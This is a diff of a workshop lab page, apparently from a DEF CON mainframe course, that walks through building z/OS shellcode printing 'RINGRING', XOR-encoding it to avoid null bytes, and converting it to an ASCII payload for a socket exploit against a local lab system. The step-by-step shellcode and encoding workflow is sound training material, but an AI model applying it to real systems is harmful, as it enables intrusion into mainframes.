@@ -1,5 +1,5 @@
 created: 20220804203418702
-modified: 20220804223726181
+modified: 20220805232038613
 tags: 
 title: Lab 14 - Sockets and EBCDIC
 type: text/vnd.tiddlywiki
@@ -12,8 +12,8 @@ Up till now we've had to manually look up the ASCII -> EBCDIC for our memory loc
 COPY     LA    R1,MSGWTO
          SVC   35
          SVC   03
-MSGWTO   DC    XL4'00070000'
-         DC    C'WTO'
+MSGWTO   DC    XL4'000C0000'
+         DC    C'RINGRING'  
 ```
 
 !! Creating the shell code
@@ -27,79 +27,107 @@ MSGWTO   DC    XL4'00070000'
 #* Put an `E` in front of `LAB13`
 #* On the command bar type `SUBMIT`
 
+If you look at line 41 you can see that the output of the assembled/linked binary is in `DC00.LOAD(WTOSML)`
+
+[img[linewtosml.png]]
+
 !! Download the shell code
+
+Similar to the previous exploit we need to download the assembled binary from FTP
 
 # Restart the FTP server: on the Command line in http://localhost:8888 (Username/password: `defcon`) type `/start ftpddc30,srvport=2126` 
 # FTP and donwload the output: 
 ## `ftp localhost 2126` 
 ## `cd DC00.LOAD`
-## `bin`
+## `bin` ⬅️ ''important''
 ## `GET WTOSML`
 
 !! Get the Bytes
 
-# Open WTOSML with your hex editor, and copy the bytes between `CAFEBABE` with Right click -> Copy as -> Value: `41 10 E0 0E 0A 23 0A 03 00 07 00 00 E6 E3 D6`. 
-# We now have the shell code we're going to use, except the Null bytes (`00`) are a big problem, we can't do that we need to convert them. There's also other troublesome bytes in here. 
-# What if we had some bytes that we XOR'd our shell code with? Well, lucky for you we do `9999999999D499D499D4999999999916`
-# Using cyberchef, we XOR the bytes and get: `D889799793F793D799D399997F7A4F16` ([[Link to the recipe if you're interested|https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'9999999999D499D499D4999999999916'%7D,'Standard',false)To_Hex('None',0)To_Upper_case('All')&input=NDExMEUwMEUwQTIzMEEwMzAwMDcwMDAwRTZFM0Q2MDA]])
+# Open WTOSML with your hex editor, and copy the bytes between `CAFEBABE` (You can skip the leading null bytes `00`) 
+#* Right click -> Copy as -> Value: `41 10 E0 0E 0A 23 0A 03 00 0C 00 00 D9 C9 D5 C7 D9 C9 D5 C7`.  
+
+[img[newwtosml.png]]
+
+We now have the shell code we're going to use, except there are still Null bytes (`00`) and other bytes that won't convert cleanly
+
+!! XOR EBCDIC
+
+# What if we had some bytes that we XOR'd our shell code with? Well, lucky for you we wrote a python script `findbytes.py` to do that for you. 
+#* Run `python3 ~/labs/findbytes.py 41 10 E0 0E 0A 23 0A 03 00 0C 00 00 D9 C9 D5 C7 D9 C9 D5 C7` which outputs: `Shellcode: D889799793BA939A9995999940504C5E40504C5E XOR Key  : 9999999999999999999999999999999999999999`
+
+
+# Or using cyberchef, we XOR the bytes and get: `D889799793BA939A9995999940504C5E40504C5E` ([[Link to the recipe if you're interested|https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')XOR(%7B'option':'Hex','string':'9999999999999999999999999999999999999999'%7D,'Standard',false)To_Hex('None',0)To_Upper_case('All')&input=NDExMEUwMEUwQTIzMEEwMzAwMEMwMDAwRDlDOUQ1QzdEOUM5RDVDNw]])
 # ''Problem'' We've XOR'd our shell code, but we need a way to un XOR it on the mainframe. Luckily Jake wrote the assembly to do just that. 
 # Open the file `DC00.JCLLIB(LAB14)` (just like we did above)
-# Replace `<THE XORED BYTES>` with `D889799793F793D799D399997F7A4F16`
+# Replace `<PUT XORED SHELLCODE HERE>` with `D889799793BA939A9995999940504C5E40504C5E`
+# Replace `<PUT XOR KEY HERE>` with `9999999999999999999999999999999999999999`
 # On the command bar type `SUBMIT` to submit the job
+
+[img[exploitxor.png]]
 
 !! Download The Final Form
 
 Our shell code is ready and waiting in `DC00.LOAD(WTOSMLX)`.
 
-# Download the shell code with FTP (and described above): `GET WTOSMLX`
+# Download the shell code with FTP (as described above, make sure you use ''binary'' download `bin`): `GET WTOSMLX`
 # Open this file with your hex editor `okteta WTOSMLX`
-# Notice our shell code is between `CAFEBABE`: `D7 0F E0 06 E0 16 D8 89 79 97 93 F7 93 D7 99 D3 99 99 7F 7A 4F 16 99 99 99 99 99 D4 99 D4 99 D4 99 99 99 99 99 16`
+# Notice our shell code is between `CAFEBABE`: `D7 14 E0 06 E0 1A D8 89 79 97 93 BA 93 9A 99 95 99 99 40 50 4C 5E 40 50 4C 5E 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99` [img[exploitshell.png]]
 #* This is what we need it to look like after it gets translated by from ASCII to EBCDIC by the socket, so we need to convert each byte to ASCII first. 
-# Lucky for you we have a included a python script in the workshop VM: `python3 ~/labs/e2alookup.py D7 0F E0 06 E0 16 D8 89 79 97 93 F7 93 D7 99 D3 99 99 7F 7A 4F 16 99 99 99 99 99 D4 99 D4 99 D4 99 99 99 99 99 16`: 
+# Instead of doing it by hand, we have a included a python script in the workshop VM: `python3 ~/labs/e2alookup.py D7 14 E0 06 E0 1A D8 89 79 97 93 BA 93 9A 99 95 99 99 40 50 4C 5E 40 50 4C 5E 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99 99`: 
 
 ```
 D7 --> 50
-0F --> 0F
+14 --> 9D
 E0 --> 5C
 06 --> 86
 E0 --> 5C
-16 --> 08
+1A --> 92
 D8 --> 51
 89 --> 69
 79 --> 60
 97 --> 70
 93 --> 6C
-F7 --> 37
+BA --> DD
 93 --> 6C
-D7 --> 50
+9A --> AA
 99 --> 72
-D3 --> 4C
-99 --> 72
-99 --> 72
-7F --> 22
-7A --> 3A
-4F --> 7C
-16 --> 08
+95 --> 6E
 99 --> 72
 99 --> 72
-99 --> 72
-99 --> 72
-99 --> 72
-D4 --> 4D
-99 --> 72
-D4 --> 4D
-99 --> 72
-D4 --> 4D
+40 --> 20
+50 --> 26
+4C --> 3C
+5E --> 3B
+40 --> 20
+50 --> 26
+4C --> 3C
+5E --> 3B
 99 --> 72
 99 --> 72
 99 --> 72
 99 --> 72
 99 --> 72
-16 --> 08
-Final String: 500F5C865C08516960706C376C50724C7272223A7C0872727272724D724D724D727272727208
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+99 --> 72
+Final String: 509D5C865C92516960706CDD6CAA726E727220263C3B20263C3B7272727272727272727272727272727272727272
 Writting bytes to shellcode.bin
 ```
 
+Notice the last line, it also writes these bytes to `shellcode.bin`.
 
 
 
